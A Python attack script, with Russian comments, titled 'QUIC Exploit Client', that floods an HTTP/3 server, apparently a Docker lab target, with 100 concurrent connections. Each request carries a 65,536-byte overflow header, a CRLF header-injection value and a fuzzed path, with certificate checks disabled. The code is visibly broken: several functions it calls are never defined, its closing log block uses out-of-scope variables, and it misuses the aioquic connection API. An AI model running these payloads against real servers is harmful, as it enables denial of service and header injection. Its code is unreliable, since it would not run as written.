import asyncio
import random
from datetime import datetime
from aioquic.quic.configuration import QuicConfiguration
from aioquic.quic.connection import QuicConnection
from aioquic.h3.connection import H3_ALPN, H3Connection
from aioquic.h3.events import HeadersReceived, DataReceived

class QuicExploitClient:
    def __init__(self, host: str, port: int):
        self.host = host
        self.port = port
        self.configuration = QuicConfiguration(
            is_client=True,
            alpn_protocols=H3_ALPN,
            verify_mode=0,  # Отключаем проверку сертификата
        )

    async def send_exploit_payload(self, iteration: int):
        try:
            # Создаем соединение
            connection = QuicConnection(configuration=self.configuration)
            await connection.connect(self.host, self.port)
            
            async with connection:
                h3_connection = H3Connection(connection)

                # Формируем вредоносные заголовки
                headers = [
                    (b":method", b"GET"),
                    (b":path", b"/?" + generate_fuzz_payload(50)),
                    (b"user-agent", b"Mozilla/5.0 (Exploit)"),
                    (b"x-overflow", b"A" * 65536),
                    (b"x-crlf", b"test\r\nInjected: header"),
                ]

                # Отправляем запрос
                stream_id = h3_connection.send_headers(
                    stream_id=connection.get_next_available_stream_id(),
                    headers=headers
                )
                h3_connection.send_data(stream_id=stream_id, data=b"PAYLOAD")

                # Получаем ответ
                response = await self.receive_response(h3_connection, stream_id)
                self.analyze_response(response, iteration)

        # обработчик ошибок
        except Exception as e:
            print(f"[{iteration}] ❌ Error: {str(e)}")

    # многопоточность (100 потоков)
    async def run_exploit(self, threads=100):
        tasks = [asyncio.create_task(self.send_exploit_payload(i)) for i in range(threads)]
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    print("QUIC Exploit Client - Sending malicious payloads")
    print("Target: vulnerable QUIC server with buffer overflow in meta tags")
    
    # здесь vsQUIC это имя контейнера Docker, но его можно заменить IP адресом
    client = QuicExploitClient("vsQUIC", 4433)
    asyncio.run(client.run_exploit(threads=100))
    
    # логирование атаки
    with open("haCker_client_log.txt", "a") as f:
        f.write(f"[{datetime.now()}] Payload sent: {headers}\n")
        f.write(f"[{datetime.now()}] Response: {response[:200]}...\n")